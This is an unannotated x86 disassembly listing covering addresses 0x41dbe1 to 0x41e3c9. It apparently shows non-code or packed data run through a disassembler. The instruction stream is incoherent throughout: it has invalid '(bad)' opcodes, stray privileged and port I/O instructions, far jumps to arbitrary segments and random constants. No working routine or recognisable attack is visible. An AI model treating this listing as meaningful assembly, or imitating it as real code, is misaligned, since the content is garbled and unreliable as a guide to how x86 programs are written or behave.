  41dbe1:	or     esp,ebp
  41dbe3:	xchg   ebp,eax
  41dbe4:	gs loope 0x41dbe5
  41dbe7:	pop    edi
  41dbe8:	jo     0x41dbfe
  41dbea:	xchg   BYTE PTR [eax+0x69],ah
  41dbed:	in     eax,dx
  41dbee:	fcomp  DWORD PTR [edx+0x2cfd1220]
  41dbf4:	sti    
  41dbf5:	adc    edi,DWORD PTR [ebx+eiz*4+0x7466e02d]
  41dbfc:	jmp    0xb6169025
  41dc01:	test   DWORD PTR [eax+0x63],ebp
  41dc04:	ins    DWORD PTR es:[edi],dx
  41dc05:	pop    ss
  41dc06:	inc    BYTE PTR [ecx+ecx*4+0x27]
  41dc0a:	add    DWORD PTR [esp],eax
  41dc0d:	or     al,0x64
  41dc0f:	sub    eax,0xc86380f2
  41dc14:	and    al,0xf5
  41dc16:	push   es
  41dc17:	mov    ds:0xa645e792,al
  41dc1c:	push   ebp
  41dc1d:	enter  0x4cb7,0x71
  41dc21:	std    
  41dc22:	jae    0x41dbdb
  41dc24:	add    eax,0xd97c92ba
  41dc29:	nop
  41dc2a:	lahf   
  41dc2b:	mov    ah,0x9b
  41dc2d:	push   0x61
  41dc2f:	cmp    BYTE PTR [edx+0x20],al
  41dc32:	adc    DWORD PTR [ebx],edx
  41dc34:	cs (bad) 
  41dc36:	scas   al,BYTE PTR es:[edi]
  41dc37:	inc    ebx
  41dc38:	cmp    al,0xf5
  41dc3a:	into   
  41dc3b:	xor    ah,dl
  41dc3d:	push   0xffffffc3
  41dc3f:	mov    cs,WORD PTR [esi+0x3d]
  41dc42:	sub    al,0x58
  41dc44:	mov    es,WORD PTR [esi+0x1c51ca07]
  41dc4a:	rol    BYTE PTR [esi],cl
  41dc4c:	mov    dh,0x2e
  41dc4e:	mov    ah,BYTE PTR [esi]
  41dc50:	or     DWORD PTR [edi],0xffffff94
  41dc53:	inc    ebp
  41dc54:	jmp    FWORD PTR [esi+edx*4+0x0]
  41dc58:	std    
  41dc59:	in     eax,dx
  41dc5a:	xchg   edi,eax
  41dc5b:	mov    bh,0xd5
  41dc5d:	sbb    eax,0x35b23571
  41dc62:	lahf   
  41dc63:	lahf   
  41dc64:	jl     0x41dcdb
  41dc66:	les    edx,FWORD PTR [esp+eiz*4-0xd]
  41dc6a:	mov    al,0x4f
  41dc6c:	pop    edx
  41dc6d:	ret    0x7ea2
  41dc70:	lds    ebp,FWORD PTR [esi-0x41]
  41dc73:	xor    al,0x6a
  41dc75:	gs mov cl,0x7b
  41dc78:	ss pushf 
  41dc7a:	add    ebx,DWORD PTR es:[ebx+0x4e772dec]
  41dc81:	repz pop edx
  41dc83:	and    al,0x72
  41dc85:	push   esp
  41dc86:	mov    dh,0x7f
  41dc88:	in     eax,0xc6
  41dc8a:	jge    0x41dc6a
  41dc8c:	fimul  WORD PTR [ebp-0x25]
  41dc8f:	jno    0x41dc99
  41dc91:	xchg   ch,dl
  41dc93:	jb     0x41dcf4
  41dc95:	inc    esp
  41dc96:	sar    DWORD PTR [eax+0x0],0x0
	...
  41dd11:	add    BYTE PTR [eax],al
  41dd13:	add    BYTE PTR [ecx+0x6a],ah
  41dd16:	jmp    0xffd9c832
  41dd1b:	jle    0x41dd23
  41dd1d:	js     0x41dccc
  41dd1f:	aam    0xf5
  41dd21:	repnz (bad) 
  41dd23:	mov    esi,0x178c9
  41dd28:	ins    BYTE PTR es:[edi],dx
  41dd29:	pop    es
  41dd2a:	add    BYTE PTR [eax],al
  41dd2c:	or     ch,al
  41dd2e:	mov    ebx,0x5e9fb7da
  41dd33:	mov    ah,BYTE PTR [eax+0x2b]
  41dd36:	ja     0x41dd65
  41dd38:	jno    0x41dd30
  41dd3a:	push   esp
  41dd3b:	xchg   esp,eax
  41dd3c:	inc    edx
  41dd3d:	jb     0x41dd35
  41dd3f:	sahf   
  41dd40:	es std 
  41dd42:	jo     0x41dce3
  41dd44:	and    dl,al
  41dd46:	sbb    dl,bh
  41dd48:	sub    edi,ecx
  41dd4a:	mov    BYTE PTR [esi+0x4e],bh
  41dd4d:	add    DWORD PTR [ebx+0x94e601d],esi
  41dd53:	addr16 sbb al,0x61
  41dd56:	icebp  
  41dd57:	xchg   DWORD PTR [ebp+0x20],esi
  41dd5a:	lock xor BYTE PTR [eax],ch
  41dd5d:	lahf   
  41dd5e:	ss loop 0x41dd29
  41dd61:	mov    edi,0xf1c4ffb5
  41dd66:	add    esi,DWORD PTR [ebx-0x4fb9856a]
  41dd6c:	pop    ecx
  41dd6d:	popf   
  41dd6e:	push   ds
  41dd6f:	cmp    DWORD PTR [edi-0x39],ebx
  41dd72:	icebp  
  41dd73:	mov    eax,0xe497be09
  41dd78:	xchg   DWORD PTR [esi+ebp*1],esp
  41dd7b:	push   ebp
  41dd7c:	mov    WORD PTR [eax+eax*8-0x7aaf07c7],fs
  41dd83:	test   eax,edx
  41dd85:	ins    DWORD PTR es:[edi],dx
  41dd86:	dec    edi
  41dd87:	fldcw  WORD PTR es:[esi-0x3bbd5029]
  41dd8e:	sbb    al,0x6a
  41dd90:	inc    edx
  41dd91:	cmp    al,0xad
  41dd93:	(bad)  
  41dd94:	and    BYTE PTR ds:0x3b66a0e7,cl
  41dd9b:	pop    eax
  41dd9c:	sub    BYTE PTR [ebx],al
  41dd9e:	push   eax
  41dd9f:	loop   0x41de11
  41dda1:	cmp    ecx,DWORD PTR [edx+ecx*8]
  41dda4:	mul    DWORD PTR [ebx+0x5218b160]
  41ddaa:	cld    
  41ddab:	fisttp DWORD PTR [esp+esi*8]
  41ddae:	in     al,dx
  41ddaf:	out    dx,al
  41ddb0:	xchg   ebp,eax
  41ddb1:	popf   
  41ddb2:	xchg   edx,eax
  41ddb3:	popa   
  41ddb4:	push   ds
  41ddb5:	mov    ebx,0x4026e4f8
  41ddba:	in     eax,0x81
  41ddbc:	sti    
  41ddbd:	iret   
  41ddbe:	inc    esi
  41ddbf:	lock pop ebp
  41ddc1:	stc    
  41ddc2:	sub    BYTE PTR [ecx+0x5b],dl
  41ddc5:	jmp    0x27cabf45
  41ddca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddcb:	dec    ebx
  41ddcc:	hlt    
  41ddcd:	repz neg DWORD PTR ds:0x115080f8
  41ddd4:	aas    
  41ddd5:	es pop edi
  41ddd7:	jp     0x41dde3
  41ddd9:	dec    ebp
  41ddda:	loop   0x41ddd0
  41dddc:	icebp  
  41dddd:	cmp    BYTE PTR [edx],bh
  41dddf:	push   edx
  41dde0:	shl    DWORD PTR [ecx+0x2f3915c2],cl
  41dde6:	sbb    dl,BYTE PTR [edi-0x6e26e6e7]
  41ddec:	cli    
  41dded:	mov    bh,0xd2
  41ddef:	adc    eax,0xe7b6b10
  41ddf4:	shl    ch,0xf7
  41ddf7:	sbb    al,0xda
  41ddf9:	in     eax,0x6
  41ddfb:	mov    dl,0xeb
  41ddfd:	jl     0x41de0c
  41ddff:	sahf   
  41de00:	outs   dx,BYTE PTR ds:[esi]
  41de01:	leave  
  41de02:	out    0x65,al
  41de04:	dec    esi
  41de05:	sahf   
  41de06:	xchg   edx,eax
  41de07:	inc    edx
  41de08:	sar    BYTE PTR [ebx+0x6d],1
  41de0b:	push   0x79
  41de0d:	scas   al,BYTE PTR es:[edi]
  41de0e:	sub    eax,0x5d5f0bde
  41de13:	(bad)  
  41de14:	cld    
  41de15:	bound  esp,QWORD PTR [ebp+0x76]
  41de18:	data16 ins BYTE PTR es:[edi],dx
  41de1a:	or     DWORD PTR [edx],edi
  41de1c:	pop    ecx
  41de1d:	into   
  41de1e:	xchg   edx,eax
  41de1f:	adc    DWORD PTR [edi-0x22a9299e],edi
  41de25:	imul   DWORD PTR [esi+ebx*8+0x447f1f5a]
  41de2c:	fldcw  WORD PTR [edx]
  41de2e:	sub    DWORD PTR [ebp-0x3cb43c19],esi
  41de34:	jmp    0x41ddd5
  41de36:	mov    edi,0x5abf3a99
  41de3b:	jbe    0x41de55
  41de3d:	ss sbb eax,0xb749471
  41de43:	jnp    0x41de54
  41de45:	(bad)  
  41de46:	das    
  41de47:	clc    
  41de48:	pop    edi
  41de49:	aas    
  41de4a:	(bad)  
  41de4c:	cdq    
  41de4d:	imul   edi,DWORD PTR [esi-0x533acea],0xffffffa2
  41de54:	mov    esi,0xbf0e948f
  41de59:	mov    edi,0xdc2a75b3
  41de5e:	cmp    DWORD PTR [edx+0x990b4bb],esi
  41de64:	xchg   DWORD PTR [esi],eax
  41de66:	cli    
  41de67:	ret    0xef9c
  41de6a:	je     0x41de5b
  41de6c:	pop    ss
  41de6d:	aad    0xb9
  41de6f:	rcr    DWORD PTR [ebx-0x3976e9d6],1
  41de75:	xor    eax,0x331752e6
  41de7a:	sbb    eax,0xf1fe1b57
  41de7f:	add    al,0x6a
  41de81:	sbb    DWORD PTR [esi],edi
  41de83:	mov    eax,0xa0aae5ea
  41de88:	js     0x41de62
  41de8a:	xlat   BYTE PTR ds:[ebx]
  41de8b:	lea    edi,[edx+esi*1+0x1b]
  41de8f:	pop    ss
  41de90:	imul   esi,DWORD PTR [esi-0x2b],0x95f3fd95
  41de97:	shl    ecx,cl
  41de99:	popf   
  41de9a:	outs   dx,DWORD PTR ds:[esi]
  41de9b:	push   0xff5dacbe
  41dea0:	adc    al,BYTE PTR [edi-0x677f4bb0]
  41dea6:	xor    edx,edx
  41dea8:	xor    ah,BYTE PTR [edi]
  41deaa:	xchg   esp,eax
  41deab:	xor    BYTE PTR ss:[edx+0x2a],ah
  41deaf:	lods   eax,DWORD PTR ds:[esi]
  41deb0:	xchg   BYTE PTR [ecx+0x224abc54],ah
  41deb6:	jecxz  0x41dec6
  41deb8:	lahf   
  41deb9:	mov    eax,0x7ef73af1
  41debe:	xchg   ebx,eax
  41debf:	dec    eax
  41dec0:	xchg   esp,eax
  41dec1:	mov    bl,0x8d
  41dec3:	js     0x41de5c
  41dec5:	icebp  
  41dec6:	(bad)  
  41dec8:	mov    cl,0x77
  41deca:	xchg   ebx,eax
  41decb:	sub    BYTE PTR [edi-0x7858a2e2],bl
  41ded1:	mov    ds:0x38265e2e,al
  41ded6:	dec    ecx
  41ded7:	test   al,0xaa
  41ded9:	call   0xd8c88971
  41dede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dedf:	jge    0x41de82
  41dee1:	xor    bl,BYTE PTR [edx]
  41dee3:	sub    esi,DWORD PTR [edx]
  41dee5:	jne    0x41df16
  41dee7:	test   DWORD PTR [esi],esp
  41dee9:	cld    
  41deea:	enter  0x3cfd,0xca
  41deee:	fnstenv [eax-0x4d]
  41def1:	add    esp,DWORD PTR [edx+0x516d871e]
  41def7:	and    ebx,esp
  41def9:	aam    0x94
  41defb:	std    
  41defc:	jge    0x41df64
  41defe:	int    0x25
  41df00:	dec    ecx
  41df01:	push   0xb
  41df03:	nop
  41df04:	xor    BYTE PTR [ebp-0x5a5d38ee],0x43
  41df0b:	mov    esp,0x3914220d
  41df10:	push   esp
  41df11:	push   es
  41df12:	dec    esi
  41df13:	jecxz  0x41df66
  41df15:	popa   
  41df16:	fadd   DWORD PTR [ebp-0x43]
  41df19:	out    dx,eax
  41df1a:	sub    DWORD PTR [esp+eiz*2+0x6f393ab5],edi
  41df21:	loopne 0x41dee1
  41df23:	xchg   ebx,eax
  41df24:	enter  0x9488,0x10
  41df28:	test   ah,dl
  41df2a:	fiadd  DWORD PTR [eax-0x714f011c]
  41df30:	mov    ecx,0x236a8372
  41df35:	out    dx,eax
  41df36:	(bad)  
  41df37:	std    
  41df38:	mov    DWORD PTR ds:0xf5bcb831,edi
  41df3e:	xchg   ebp,eax
  41df3f:	je     0x41df69
  41df41:	lods   eax,DWORD PTR ds:[esi]
  41df42:	mov    esp,0xfaa8ce57
  41df47:	adc    bl,BYTE PTR [esi]
  41df49:	dec    esi
  41df4a:	inc    esp
  41df4b:	int3   
  41df4c:	push   ds
  41df4d:	mov    esi,0x3b596d70
  41df52:	cwde   
  41df53:	test   DWORD PTR ds:0xf2919823,edx
  41df59:	cs inc ebp
  41df5b:	shr    BYTE PTR [edx],0xd1
  41df5e:	adc    al,0xca
  41df60:	mov    ecx,0x7708731e
  41df65:	inc    ebp
  41df66:	sbb    ebp,DWORD PTR [ebx-0x44]
  41df69:	ret    
  41df6a:	lods   eax,DWORD PTR ds:[esi]
  41df6b:	in     al,dx
  41df6c:	pop    esi
  41df6d:	jb     0x41df22
  41df6f:	adc    eax,0x8950c01b
  41df74:	jmp    0x5baa:0x5472d45
  41df7b:	push   0x23557788
  41df80:	sahf   
  41df81:	jle    0x41df1c
  41df83:	fcomp  QWORD PTR [ebp+eiz*1+0x363d23b]
  41df8a:	mov    esp,edx
  41df8c:	(bad)  
  41df8d:	hlt    
  41df8e:	or     BYTE PTR [edi+0x792748b2],bh
  41df94:	cmp    DWORD PTR [edx],0x24a0112e
  41df9a:	test   eax,0x3c009512
  41df9f:	xchg   DWORD PTR [ecx+ebx*8-0x7f],edx
  41dfa3:	enter  0x923b,0xfe
  41dfa7:	lock outs dx,DWORD PTR ds:[esi]
  41dfa9:	cmp    ch,BYTE PTR [ebp+ecx*2+0x6939e22a]
  41dfb0:	mov    ch,0xde
  41dfb2:	mov    esi,0x6ecfc0ff
  41dfb7:	data16 mov ah,0x64
  41dfba:	ror    DWORD PTR [esi+0x63],0x43
  41dfbe:	pmullw mm0,mm3
  41dfc1:	into   
  41dfc2:	lock aas 
  41dfc4:	jle    0x41e019
  41dfc6:	stc    
  41dfc7:	push   edi
  41dfc8:	je     0x41e029
  41dfca:	fmulp  st(2),st
  41dfcc:	jecxz  0x41df7b
  41dfce:	imul   ebp,DWORD PTR [eax-0x1f10c928],0x6d
  41dfd5:	cmc    
  41dfd6:	gs push esp
  41dfd8:	jge    0x41dfe9
  41dfda:	jo     0x41e024
  41dfdc:	shr    DWORD PTR [esi+eax*4-0x5c],cl
  41dfe0:	jge    0x41dfe9
  41dfe2:	push   ecx
  41dfe3:	jno    0x41df95
  41dfe5:	ret    0x8914
  41dfe8:	mov    esp,0x6c93821d
  41dfed:	addr16 ss loop 0x41dfb9
  41dff1:	mov    edi,0xa32f9fa1
  41dff6:	jne    0x41dff5
  41dff8:	sbb    BYTE PTR [ebp-0x2c],cl
  41dffb:	gs jo  0x41dfd3
  41dffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfff:	fnsave [edx+0x436da7e0]
  41e005:	leave  
  41e006:	out    0xd4,al
  41e008:	sub    esp,DWORD PTR [esi+ebx*8]
  41e00b:	fld    QWORD PTR [ebx]
  41e00d:	pushf  
  41e00e:	int    0x6e
  41e010:	push   es
  41e011:	mov    edi,0x2db72f84
  41e016:	dec    ecx
  41e017:	and    DWORD PTR [edx-0x3c261274],eax
  41e01d:	and    al,0x5
  41e01f:	xlat   BYTE PTR ds:[ebx]
  41e020:	add    al,0x11
  41e022:	stos   BYTE PTR es:[edi],al
  41e023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e024:	mov    al,0xa3
  41e026:	mov    ds:0x24eac406,al
  41e02b:	cmp    DWORD PTR [ebx+0x6ad106f5],ecx
  41e031:	repz push edi
  41e033:	cli    
  41e034:	std    
  41e035:	inc    ebx
  41e036:	rol    DWORD PTR [ebp-0x7f50ea3e],cl
  41e03c:	jns    0x41e07b
  41e03e:	mov    esp,0xa1075a76
  41e043:	stos   DWORD PTR es:[edi],eax
  41e044:	shr    BYTE PTR [esi-0xd],0xf2
  41e048:	jo     0x41e0bd
  41e04a:	loope  0x41e066
  41e04c:	in     al,dx
  41e04d:	imul   ecx,DWORD PTR [edx+0x23],0x29e5d05a
  41e054:	push   edi
  41e055:	(bad)  
  41e056:	popa   
  41e057:	stos   DWORD PTR es:[edi],eax
  41e058:	dec    edx
  41e059:	sbb    edi,DWORD PTR [edi-0x15]
  41e05c:	mov    al,0x65
  41e05e:	pop    ds
  41e05f:	jmp    0x22a596c
  41e064:	ss add al,0xa6
  41e067:	repz repnz and BYTE PTR [esi+0x78dac642],ch
  41e06f:	adc    DWORD PTR [esi-0x61],esi
  41e072:	fdivr  QWORD PTR [esi-0x719299fe]
  41e078:	add    al,0xb9
  41e07a:	adc    BYTE PTR [eax*8-0x5344ddc0],al
  41e081:	neg    BYTE PTR [edx+edx*4]
  41e084:	sbb    ah,BYTE PTR [edx+0x4a]
  41e087:	xchg   ebp,eax
  41e088:	jmp    0x8d48:0x8c65881c
  41e08f:	jne    0x41e06e
  41e091:	jne    0x41e044
  41e093:	adc    BYTE PTR [eax],bh
  41e095:	xor    edi,ebx
  41e097:	xchg   edx,eax
  41e098:	fdiv   DWORD PTR [ecx+0x69433ab7]
  41e09e:	sbb    eax,0x799fc2a5
  41e0a3:	fcomip st,st(3)
  41e0a5:	jg     0x41e10a
  41e0a7:	pop    es
  41e0a8:	adc    eax,0x695c7f5b
  41e0ad:	mov    edx,eax
  41e0af:	outs   dx,DWORD PTR ds:[esi]
  41e0b0:	pop    esi
  41e0b1:	jmpw   0xeeaa
  41e0b5:	sbb    al,0x66
  41e0b7:	cmp    BYTE PTR [edx+0x66],cl
  41e0ba:	scas   al,BYTE PTR es:[edi]
  41e0bb:	push   edi
  41e0bc:	repz inc ebx
  41e0be:	ins    BYTE PTR es:[edi],dx
  41e0bf:	ins    DWORD PTR es:[edi],dx
  41e0c0:	loop   0x41e080
  41e0c2:	loop   0x41e0fd
  41e0c4:	xor    al,0x82
  41e0c6:	dec    eax
  41e0c7:	in     eax,dx
  41e0c8:	ins    BYTE PTR es:[edi],dx
  41e0c9:	jnp    0x41e0ce
  41e0cb:	inc    edi
  41e0cc:	xchg   DWORD PTR [ecx-0x2f],ebp
  41e0cf:	sbb    BYTE PTR [esi+0x16],bh
  41e0d2:	inc    edi
  41e0d3:	mov    cl,0x2f
  41e0d5:	mov    WORD PTR [esi+ebp*4-0x320e034a],fs
  41e0dc:	jg     0x41e09d
  41e0de:	loopne 0x41e140
  41e0e0:	and    esp,DWORD PTR [eax]
  41e0e2:	call   0x52b43393
  41e0e7:	jl     0x41e0a4
  41e0e9:	lock xor BYTE PTR [edx-0x5f],dh
  41e0ed:	rcr    DWORD PTR [esi-0x66],1
  41e0f0:	inc    esp
  41e0f1:	jb     0x41e0de
  41e0f3:	and    eax,0xd1d48da0
  41e0f8:	jg     0x41e08d
  41e0fa:	adc    eax,0x75e039f2
  41e0ff:	pop    ss
  41e100:	mov    cl,0xeb
  41e102:	add    ebp,esi
  41e104:	mov    ebx,0xebca4d31
  41e109:	stos   BYTE PTR es:[edi],al
  41e10a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e10b:	inc    edx
  41e10c:	xchg   ebx,eax
  41e10d:	sar    BYTE PTR [esi+0x52bd405f],1
  41e113:	pop    ecx
  41e114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e115:	stos   BYTE PTR es:[edi],al
  41e116:	xchg   esp,eax
  41e117:	clc    
  41e118:	sub    eax,0x665b6ec5
  41e11d:	dec    esp
  41e11e:	jmp    0x41e137
  41e120:	ja     0x41e167
  41e122:	cdq    
  41e123:	pop    edx
  41e124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e125:	jmp    0x4b3:0x3648b10d
  41e12c:	daa    
  41e12d:	outs   dx,BYTE PTR ds:[esi]
  41e12e:	and    BYTE PTR [ecx-0x4b448753],0x61
  41e135:	cs scas eax,DWORD PTR es:[edi]
  41e137:	sub    DWORD PTR [esi-0x17],edx
  41e13a:	mov    al,ds:0xa7588f30
  41e13f:	(bad)  
  41e140:	dec    edi
  41e141:	push   edi
  41e142:	inc    ebp
  41e143:	sbb    al,0xca
  41e145:	mov    al,ds:0x62a8c16e
  41e14a:	xchg   edx,eax
  41e14b:	jl     0x41e18d
  41e14d:	xor    ebx,esp
  41e14f:	std    
  41e150:	scas   eax,DWORD PTR es:[edi]
  41e151:	inc    eax
  41e152:	mov    ebx,DWORD PTR [ecx]
  41e154:	(bad)  
  41e156:	mov    edx,0x8e9e8120
  41e15b:	pop    ebx
  41e15c:	scas   al,BYTE PTR es:[edi]
  41e15d:	jns    0x41e15f
  41e15f:	aas    
  41e160:	add    al,BYTE PTR [ebp+0x6ac8e728]
  41e166:	mov    DWORD PTR ss:[eax-0x4a343a16],edi
  41e16d:	sub    al,0xda
  41e16f:	loopne 0x41e11f
  41e171:	push   esi
  41e172:	mov    ebx,?
  41e174:	scas   al,BYTE PTR es:[edi]
  41e175:	mov    esp,0xd554dfef
  41e17a:	mov    edx,edx
  41e17c:	push   ebx
  41e17d:	sbb    ebx,DWORD PTR [ebx]
  41e17f:	push   ebx
  41e180:	cdq    
  41e181:	stos   DWORD PTR es:[edi],eax
  41e182:	cwde   
  41e183:	mov    DWORD PTR [ebx-0x17813402],0x3db5d06b
  41e18d:	push   0x35312f46
  41e192:	xchg   edi,eax
  41e193:	jmp    0xdb38:0x9db41fd3
  41e19a:	stos   BYTE PTR es:[edi],al
  41e19b:	xor    DWORD PTR [ecx],edx
  41e19d:	mov    ch,0xff
  41e19f:	icebp  
  41e1a0:	xchg   ebp,eax
  41e1a1:	mov    esp,0x162be5b4
  41e1a6:	clc    
  41e1a7:	aad    0xbb
  41e1a9:	into   
  41e1aa:	dec    eax
  41e1ab:	jnp    0x41e219
  41e1ad:	jecxz  0x41e1e4
  41e1af:	into   
  41e1b0:	xchg   edx,eax
  41e1b1:	into   
  41e1b2:	call   0xf4a7:0x6e694738
  41e1b9:	mov    cl,BYTE PTR [ecx]
  41e1bb:	xchg   BYTE PTR [eax],cl
  41e1bd:	jno    0x41e174
  41e1bf:	mov    ecx,0xef89cd1d
  41e1c4:	sbb    BYTE PTR [ecx+0x722d34be],0x1d
  41e1cb:	jecxz  0x41e1a6
  41e1cd:	pop    ecx
  41e1ce:	mov    edx,0xbd0a969d
  41e1d3:	fisubr DWORD PTR [ebp-0xe]
  41e1d6:	mov    ds,WORD PTR [edx]
  41e1d8:	cli    
  41e1d9:	sub    eax,0x7d7f9a95
  41e1de:	xchg   ebx,eax
  41e1df:	sbb    cl,BYTE PTR ds:0x2b697c5
  41e1e5:	add    eax,DWORD PTR [edx+0x3a]
  41e1e8:	pop    eax
  41e1e9:	(bad)  
  41e1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1eb:	dec    edi
  41e1ec:	into   
  41e1ed:	xchg   DWORD PTR [esi+0x28],edi
  41e1f0:	out    0xf2,eax
  41e1f2:	ficomp WORD PTR [edi-0x2c]
  41e1f5:	into   
  41e1f6:	es push 0x4f
  41e1f9:	cli    
  41e1fa:	std    
  41e1fb:	test   DWORD PTR [ebx+0x1d],eax
  41e1fe:	and    ebp,edi
  41e200:	cwde   
  41e201:	into   
  41e202:	iret   
  41e203:	inc    edx
  41e204:	jmp    0xe4f69e82
  41e209:	cli    
  41e20a:	pop    edx
  41e20b:	xlat   BYTE PTR ds:[ebx]
  41e20c:	div    DWORD PTR [edx+0x16]
  41e20f:	scas   eax,DWORD PTR es:[edi]
  41e210:	mov    ch,0x93
  41e212:	push   ss
  41e213:	lds    ebx,FWORD PTR [eax]
  41e215:	(bad)  
  41e216:	shl    DWORD PTR [edx],cl
  41e218:	jmp    0x41e1f1
  41e21a:	in     al,0x90
  41e21c:	mov    bl,bh
  41e21e:	mov    edx,0x13aab8ff
  41e223:	xchg   edx,eax
  41e224:	out    0xc4,al
  41e226:	idiv   DWORD PTR [edx+0x6b]
  41e229:	jmp    0xe72a:0xcdbf9382
  41e230:	xchg   dl,ah
  41e232:	mov    ebp,0x99415f37
  41e237:	cld    
  41e238:	ret    0xa33
  41e23b:	test   DWORD PTR [esi+eiz*1-0xd],edi
  41e23f:	ins    DWORD PTR es:[edi],dx
  41e240:	push   esp
  41e241:	sub    al,0xd5
  41e243:	std    
  41e244:	pushf  
  41e245:	dec    edx
  41e246:	(bad)  
  41e247:	fwait
  41e248:	push   edx
  41e249:	gs daa 
  41e24b:	das    
  41e24c:	xchg   edx,eax
  41e24d:	pushf  
  41e24e:	aaa    
  41e24f:	xlat   BYTE PTR ds:[ebx]
  41e251:	push   cs
  41e252:	xchg   BYTE PTR [ebx],dh
  41e254:	loope  0x41e1dd
  41e256:	fisttp DWORD PTR [edi+0x57b7476a]
  41e25c:	cdq    
  41e25d:	jp     0x41e252
  41e25f:	shr    DWORD PTR [ebp+eiz*1-0x7f],0xa5
  41e264:	jo     0x41e2da
  41e266:	stos   DWORD PTR es:[edi],eax
  41e267:	fbstp  TBYTE PTR [ebp+0x69]
  41e26a:	int3   
  41e26b:	mov    ecx,0x40c084ae
  41e270:	scas   eax,DWORD PTR es:[edi]
  41e271:	cmp    DWORD PTR [edx-0x690de77c],ebx
  41e277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e278:	int3   
  41e279:	mov    ebp,0xbefc22a9
  41e27e:	dec    edi
  41e27f:	adc    eax,0xcf10a044
  41e284:	or     DWORD PTR [ebx],0x27a3bd3e
  41e28a:	icebp  
  41e28b:	into   
  41e28c:	dec    edi
  41e28d:	pop    eax
  41e28e:	mov    bh,dh
  41e290:	das    
  41e291:	div    BYTE PTR [edi+esi*8+0x194ba8a1]
  41e298:	jl     0x41e30d
  41e29a:	pop    edx
  41e29b:	mov    esi,0xc3cd0dfa
  41e2a0:	mov    fs,WORD PTR [ebx]
  41e2a2:	jecxz  0x41e26f
  41e2a4:	das    
  41e2a5:	test   al,0xd8
  41e2a7:	mov    ebp,0xf132c9f1
  41e2ac:	in     al,dx
  41e2ad:	mov    esi,0x77a68345
  41e2b2:	mov    esi,0x95681439
  41e2b7:	cdq    
  41e2b8:	or     esp,edi
  41e2ba:	not    BYTE PTR [eax+0x190c0d5]
  41e2c0:	enter  0x5bfd,0xf0
  41e2c4:	icebp  
  41e2c5:	mov    ds:0x27db87ec,eax
  41e2ca:	out    0x99,al
  41e2cc:	call   0x62d6b4c1
  41e2d1:	lods   eax,DWORD PTR ds:[esi]
  41e2d2:	fnstcw WORD PTR [esi+0x4b8a728d]
  41e2d8:	pop    ebx
  41e2d9:	scas   eax,DWORD PTR es:[edi]
  41e2da:	mov    ebp,0x497efcdc
  41e2df:	mov    DWORD PTR [ebx+0x52168435],edx
  41e2e5:	pusha  
  41e2e6:	mov    WORD PTR [ebx],gs
  41e2e8:	or     cl,BYTE PTR [edi+ecx*2]
  41e2eb:	adc    bh,BYTE PTR ds:0xc035a715
  41e2f1:	out    0x86,eax
  41e2f3:	sbb    BYTE PTR [edx],dh
  41e2f5:	push   eax
  41e2f6:	loopne 0x41e343
  41e2f8:	xchg   edi,eax
  41e2f9:	jo     0x41e2ba
  41e2fb:	add    ah,BYTE PTR [edx-0x51a58555]
  41e301:	cli    
  41e302:	xchg   DWORD PTR [esp+eiz*2+0x3bec1f17],ebp
  41e309:	jbe    0x41e320
  41e30b:	and    eax,0x5759cb5b
  41e310:	sahf   
  41e311:	xor    al,0x15
  41e313:	aaa    
  41e314:	cmc    
  41e315:	pop    esi
  41e316:	push   edi
  41e317:	out    0xb3,al
  41e319:	cmp    dh,bl
  41e31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e31c:	and    eax,DWORD PTR [ebx-0x28a6a759]
  41e322:	mov    cl,0x3b
  41e324:	or     bl,ch
  41e326:	pop    ebp
  41e327:	shl    edi,1
  41e329:	dec    edx
  41e32a:	pushf  
  41e32b:	mov    al,0xca
  41e32d:	mov    dl,0xba
  41e32f:	cli    
  41e330:	adc    eax,0x15630203
  41e335:	inc    esp
  41e336:	shl    DWORD PTR [ecx+0x17c9549],0x99
  41e33d:	les    esi,FWORD PTR [eiz*1-0x6faf8b1]
  41e344:	xor    esp,DWORD PTR [ecx-0x5d]
  41e347:	push   ebp
  41e348:	sub    BYTE PTR [ebp-0x49],dl
  41e34b:	add    al,0x7d
  41e34d:	sbb    edx,esp
  41e34f:	and    eax,0x2db07975
  41e354:	jb     0x41e356
  41e356:	or     BYTE PTR [edx+eax*8],cl
  41e359:	pop    ecx
  41e35a:	mov    WORD PTR [edi],cs
  41e35c:	daa    
  41e35d:	(bad)  
  41e35e:	clc    
  41e35f:	inc    ebx
  41e360:	xor    BYTE PTR ds:0x6d7d36ad,bl
  41e366:	test   DWORD PTR [edi+0x2cb99245],ebx
  41e36c:	inc    eax
  41e36d:	xor    eax,0xf37d4ab6
  41e372:	jmp    0x2b3b34ca
  41e377:	fsub   st(7),st
  41e379:	xchg   ecx,eax
  41e37a:	jae    0x41e3c6
  41e37c:	xor    DWORD PTR [ebp+0x47390a91],edi
  41e382:	mov    DWORD PTR [ecx],esi
  41e384:	clc    
  41e385:	sti    
  41e386:	ds mov ebx,0xa741faea
  41e38c:	cld    
  41e38d:	dec    edx
  41e38e:	sbb    al,0x76
  41e390:	addr16 js 0x41e332
  41e393:	adc    BYTE PTR [esi+0x2124ad3d],0xe6
  41e39a:	mov    eax,0x90eb38a5
  41e39f:	adc    al,0x2e
  41e3a1:	sbb    al,BYTE PTR [ebx-0x3ddbd97e]
  41e3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3a8:	sub    al,0xb9
  41e3aa:	scas   eax,DWORD PTR es:[edi]
  41e3ab:	test   ebx,ebp
  41e3ad:	pop    ecx
  41e3ae:	jge    0x41e418
  41e3b0:	jmp    0x328f:0x51c9277a
  41e3b7:	daa    
  41e3b8:	nop
  41e3b9:	inc    esp
  41e3ba:	inc    ebp
  41e3bb:	aam    0x63
  41e3bd:	arpl   WORD PTR [edx-0x4f347503],cx
  41e3c3:	loopne 0x41e3ff
  41e3c5:	add    cl,al
  41e3c7:	stos   BYTE PTR es:[edi],al
  41e3c8:	sti    
  41e3c9:	fstp   TBYTE PTR [edx-0x63755221]
